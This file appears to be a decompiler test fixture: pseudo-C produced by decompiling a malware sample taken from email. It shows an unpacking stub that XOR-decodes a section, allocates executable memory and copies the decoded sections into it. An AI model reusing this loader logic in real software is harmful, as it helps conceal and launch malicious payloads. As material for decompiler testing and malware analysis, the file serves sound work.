// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0831/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn0040103A(Eq_15 * fs)
{
fn0040103A_entry:
l0040103A:
l00401059:
	code * eax_68 = GetProcAddress(GetModuleHandleA(0x00401020), 0x0040102A)
	eax_68()
l004010A5:
	Eq_14 * eax_119 = fs->ptr0018
l004010C7:
	Eq_18 * eax_122 = eax_119->ptr0030->ptr0008
	Eq_25 * eax_124 = eax_122 + Mem0[eax_122 + 0x0000003C:word32]
l004010E0:
	word32 edx_130 = eax_124->dw0088
l004010EB:
	Eq_34 * edx_131 = edx_130 + eax_122
	Eq_36 eax_132 = edx_131->t0074
l00401109:
l0040111D:
l0040112E:
	VirtualProtect(&edx_131->u0088, eax_132, 0x00000004, fp - 0x0000004C)
l00401141:
	Eq_36 ecx_181 = eax_132
	byte al_183 = (byte) (eax_68 & 0x0000000F)
	Eq_58 * edi_184 = &edx_131->u0088
l00401152:
	edi_184->b0000 = edi_184->b0000 ^ al_183;
	edi_184 = edi_184 + 1;
l0040115D:
	ecx_181 = ecx_181 - 0x00000001;
	branch ecx_181 != 0x00000000 l00401152
l0040115F:
	Eq_73 * eax_221 = &edx_131->u0088 + edx_131->dw00C4
	Mem224[fp - 0x00000050:word32] = Mem189[eax_221 + 0x00000050:word32]
	Eq_85 dwLoc54_227 = eax_221->t0034
l00401198:
	Eq_36 eax_242 = VirtualAlloc(dwLoc54_227, 0x00000004, 0x00003000, 0x00000040)
	fp->tFFFFFFB8 = eax_242;
	Mem253[fp - 0x00000048:word32] = edx_131 + 0x00000088
	fp->tFFFFFFB8 = ecx_181;
	Eq_110 * eax_262 = (word32 *) 0x0000007C + 0x00000040
l004011C1:
	word32 ecx_265 = eax_262->dw0054
l004011D5:
l004011DC:
	fn0040125F(ecx_265, &edx_131->u0088, eax_242)
l004011E6:
	Eq_126 * edx_302 = &edx_131->u0088 + edx_131->dw00C4 + 0x000000F8
l00401205:
l00401208:
	Eq_36 edi_317 = eax_242 + Mem257[edx_302 + 0x0000000C:word32]
	Eq_122 * esi_319 = &edx_131->u0088 + edx_302->dw0014
l0040121D:
	word32 ecx_321 = edx_302->dw0010
	branch ecx_321 == 0x00000000 l00401235
l00401224:
l0040122A:
	fn0040125F(ecx_321, esi_319, edi_317)
	edx_302 = edx_302 + 1;
	goto l00401205
l00401235:
l00401245:
fn0040103A_exit:
}

void fn0040125F(word32 ecx, Eq_122 * esi, Eq_36 edi)
{
	do
	{
		Mem14[edi + 0x00000000:byte] = Mem0[esi + 0x00000000:byte];
		esi = esi + 1;
		edi = edi + 0x00000001;
		ecx = ecx - 0x00000001;
	} while (ecx != 0x00000000);
	return;
}

